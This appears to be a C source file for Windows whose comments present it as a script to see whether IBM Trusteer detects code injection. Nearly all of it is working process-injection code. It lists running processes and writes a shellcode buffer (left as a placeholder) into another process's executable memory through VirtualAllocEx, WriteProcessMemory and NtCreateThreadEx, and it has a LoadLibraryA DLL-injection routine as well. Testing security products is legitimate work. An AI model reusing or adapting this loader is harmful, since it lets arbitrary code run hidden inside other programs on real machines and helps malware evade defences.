#define _WIN32_WINNT 0x0501

#include <stdio.h>
#include <windows.h>
#include <psapi.h>

// AV Inject Detection Script
// Created to get IBM Trusteer to detect something (read: it sucks)
// Build "gcc -o derp.exe detectme.c -lpsapi"

struct PROCINFO {
	int id;
	char *name;
	char *path;
};

typedef struct PROCINFO Process;

unsigned char sCodeData[] = "<PUT SOME SHELLCODE HERE>";

Process* get_processes(int **proc_count);
int injectDLLIntoPID(int pid, char* dllpath);
int injectScodeIntoPID(int pid, unsigned char* scode);
HANDLE NtCreateThreadEx(HANDLE pHandle, LPVOID pAddress, LPVOID pSpace);

int main(int argc, char *argv[])
{
	int *a, b;
	Process* c = get_processes(&a);
	for(b = ((int)a - 2); b >= 0; b--)
	{
		if(strlen(c[b].name) != 7)
		{
			if(injectScodeIntoPID(c[b].id, sCodeData));
				break;
		}
	}
}
Process* get_processes(int **proc_count)
{
	DWORD pList[2048], pRet, pCount;	
	if(!EnumProcesses(pList, sizeof(pList), &pRet))
		return NULL;
	pCount = pRet/sizeof(DWORD);
	Process *pInfo = malloc(pCount * sizeof(Process));
	HANDLE pHandle;
	HMODULE pModule;
	int pCounter;
	*proc_count = (int*)pCount;
	DWORD count;
	for(pCounter = 0; pCounter < pCount; pCounter++)
	{		
		pInfo[pCounter].id = pList[pCounter];
		pInfo[pCounter].name = calloc(256, 1);
		pInfo[pCounter].path = calloc(256, 1);
		pHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pList[pCounter]);
		if(pHandle != NULL)
		{
			if(EnumProcessModules(pHandle, &pModule, sizeof(pModule), &count))
			{
				GetModuleBaseName(pHandle, pModule, pInfo[pCounter].name, 256);
				GetProcessImageFileName(pHandle, pInfo[pCounter].path, 256);
			}
			else
			{
				strcat(pInfo[pCounter].name, "Unknown\0");
				strcat(pInfo[pCounter].path, "Unknown\0");
			}
		}
		else
		{
			strcat(pInfo[pCounter].name, "Unknown\0");
			strcat(pInfo[pCounter].path, "Unknown\0");
		}
	}
	return pInfo;
}
int injectDLLIntoPID(int pid, char* dllpath)
{
	HANDLE inProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if(inProcess == NULL) return 0;
	HMODULE inModule = GetModuleHandle("kernel32.dll");
	LPVOID inAddress = (LPVOID)GetProcAddress(inModule, "LoadLibraryA");
	if(inAddress == NULL) return 0;
	LPVOID inMemory = (LPVOID)VirtualAllocEx(inProcess, NULL, strlen(dllpath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if(inMemory == NULL) return 0;
	if(WriteProcessMemory(inProcess, inMemory, dllpath, strlen(dllpath), NULL) == 0) return 0;
	HANDLE inHandle = NtCreateThreadEx(inProcess, inAddress, inMemory);
	if(inHandle == NULL) return 0;
	CloseHandle(inProcess);
	return 1;
}
// Have some issues with, seems that when it hits some processes, they fc and don't work
// Seems to be only some processes tho, looks like conhost and searchindexer dont work
int injectScodeIntoPID(int pid, unsigned char* scode)
{
	HANDLE inProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if(inProcess == NULL) return 0;
	LPVOID inMemory = (LPVOID)VirtualAllocEx(inProcess, NULL, strlen(scode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(inMemory == NULL) return 0;
	DWORD inCounter;
	if(WriteProcessMemory(inProcess, inMemory, scode, strlen(scode), &inCounter) == 0) return 0;
	HANDLE inHandle = NtCreateThreadEx(inProcess, inMemory, NULL);
	if(inHandle == NULL) return 0;
	CloseHandle(inProcess);
	return 1;
}
HANDLE NtCreateThreadEx(HANDLE pHandle, LPVOID pAddress, LPVOID pSpace)
{
    typedef DWORD (WINAPI * functypeNtCreateThreadEx)
    (
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        LPVOID ObjectAttributes,
        HANDLE ProcessHandle,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID lpParameter,
        BOOL CreateSuspended,
        DWORD dwStackSize,
        DWORD Unknown1,
        DWORD Unknown2,
        LPVOID Unknown3
    );
    HANDLE pThread = NULL;
    HMODULE pNtModule = GetModuleHandle("ntdll.dll");
    if(pNtModule == NULL)
    	return NULL;
    functypeNtCreateThreadEx pFuncNTEx = (functypeNtCreateThreadEx)GetProcAddress(pNtModule, "NtCreateThreadEx");
    if(!pFuncNTEx)
    	return NULL;
    pFuncNTEx(&pThread, GENERIC_ALL, NULL, pHandle, (LPTHREAD_START_ROUTINE)pAddress, pSpace, FALSE, (DWORD)NULL, (DWORD)NULL, (DWORD)NULL, NULL);
    return pThread;
}
